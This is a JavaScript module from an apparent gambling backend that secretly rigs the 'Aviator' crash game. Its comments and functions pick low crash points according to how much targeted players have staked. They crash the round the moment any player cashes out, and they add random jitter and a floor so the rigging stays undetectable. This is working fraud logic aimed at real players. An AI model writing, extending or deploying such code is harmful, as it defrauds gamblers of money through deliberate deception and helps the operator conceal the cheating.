/**
 * Moved verbatim from backend/server.js's "Aviator crash-point selection, driven by the live book"
 * section. The Aviator round-tick loop (tickAviator) itself, and all phase/settlement handling,
 * stays in backend/server.js — this file only holds the pure decision math it calls into.
 */
const deps = require('../deps');

// Aviator's live profit-advisory calculator — computes what the admin's profit would be if the round
// crashed RIGHT NOW: still-pending stakes and already-lost stakes become house profit, while payouts
// already given to users who cashed out early are a cost. Optionally scoped to a subset of usernames
// (the bot's currently-targeted live players).
function calculateAviatorLiveProfit(bets, targetedUsernames) {
  const list = Array.isArray(bets) ? bets : [];
  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
    : null;
  const scoped = targeted ? list.filter(b => targeted.has(String(b.username || '').toLowerCase())) : list;

  const pendingStake = scoped.filter(b => b.status === 'pending').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
  const lostStake = scoped.filter(b => b.status === 'lost').reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
  const alreadyPaid = scoped.filter(b => b.status === 'won').reduce((s, b) => s + (parseFloat(b.amount) || 0) * (parseFloat(b.cashed_multiplier) || 1), 0);

  return {
    scoped_count: scoped.length,
    pending_stake: parseFloat(pendingStake.toFixed(2)),
    already_paid: parseFloat(alreadyPaid.toFixed(2)),
    profit_if_crash_now: parseFloat((pendingStake + lostStake - alreadyPaid).toFixed(2))
  };
}

// --- Aviator crash-point selection, driven by the live book -------------------------------------
//
// The original rigged crash point was `1.12 + Math.random() * 0.42` — a number that never looked at
// a single bet on the table. calculateAviatorLiveProfit above already knew what the round was
// actually worth, but nothing consumed it outside an admin readout. These two functions close that
// gap: the same profit figure the operator sees is now what decides the round.
//
// One property of this game drives the whole design. profit_if_crash_now is
// `pendingStake + lostStake - alreadyPaid`, and during a flight it can only ever move DOWN: the sole
// event that changes it is a player cashing out, which removes their stake from `pending` and adds
// `stake × multiplier` to `alreadyPaid`. So house profit peaks the instant the plane takes off and
// erodes from there. A naive "maximise profit" rule therefore degenerates to "crash at 1.00x every
// round", which would be maximally profitable and instantly obvious.
//
// So the real objective is: take the profit near its peak, but not so early that the crash history
// stops looking like a game. That is a stake-weighted trade-off, and it is what these two do —
// pickAviatorCrashPoint sets the ceiling before takeoff, and aviatorShouldCrashNow watches for the
// first sign of erosion during the flight and takes the money then.

const AVIATOR_CRASH_AGGRESSIVE = 1.12; // tightest plausible crash — used when a lot of stake is exposed
const AVIATOR_CRASH_RELAXED = 1.54;    // upper end of the rigged band — the original code's ceiling
const AVIATOR_CRASH_FLOOR = 1.10;      // never intercept below this: a sub-1.10 crash reads as broken

/**
 * Chooses the crash point for a round the takeover engine has already selected.
 *
 * Scaling is deliberate rather than cosmetic: crashing low costs credibility, so it is spent only
 * where it buys something. A round with heavy targeted exposure crashes near AVIATOR_CRASH_AGGRESSIVE
 * because the profit justifies it; a near-empty round is allowed to run to a natural-looking
 * multiplier, because holding it down would burn plausibility to win almost nothing.
 *
 * Returns null when the round has no targeted stake to act on, letting the caller keep its existing
 * behaviour untouched.
 */
function pickAviatorCrashPoint(bets, targetedUsernames) {
  const list = Array.isArray(bets) ? bets : [];
  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
    : null;

  const pending = list.filter(b => b.status === 'pending');
  if (pending.length === 0) return null; // nothing at risk — caller keeps its no-bets behaviour

  const scoped = targeted ? pending.filter(b => targeted.has(String(b.username || '').toLowerCase())) : pending;
  const scopedStake = scoped.reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
  if (scopedStake <= 0) return null;

  // 0 → no meaningful exposure, 1 → at or above the "large round" reference.
  const highStakeRef = deps.get().config.AVIATOR_HIGH_STAKE_REF;
  const ref = highStakeRef > 0 ? highStakeRef : 1000;
  const exposure = Math.max(0, Math.min(1, scopedStake / ref));

  const band = AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE;
  const base = AVIATOR_CRASH_RELAXED - (exposure * band);

  // A little jitter so repeated similar rounds do not produce an identical multiplier every time,
  // which would be a clearer tell than the low crash itself.
  const jitter = (Math.random() - 0.5) * 0.08;
  const crash = Math.max(AVIATOR_CRASH_FLOOR, base + jitter);
  return parseFloat(crash.toFixed(2));
}

/**
 * In-flight erosion check: has a cash-out started eating into the round's profit?
 *
 * Because profit only falls, any drop below the high-water mark means a player has taken money off
 * the table and the rest of the pending stake is now at risk of following. That is the moment to
 * crash. The `epsilon` avoids reacting to floating-point noise, and the multiplier floor keeps an
 * early cash-out from producing an implausible sub-1.10 crash.
 */
function aviatorShouldCrashNow(currentMultiplier, peakProfit, currentProfit) {
  if (currentMultiplier < AVIATOR_CRASH_FLOOR) return false;
  if (!Number.isFinite(peakProfit) || !Number.isFinite(currentProfit)) return false;
  const epsilon = 0.01;
  return currentProfit < peakProfit - epsilon;
}

module.exports = {
  AVIATOR_CRASH_AGGRESSIVE,
  AVIATOR_CRASH_RELAXED,
  AVIATOR_CRASH_FLOOR,
  calculateAviatorLiveProfit,
  pickAviatorCrashPoint,
  aviatorShouldCrashNow
};
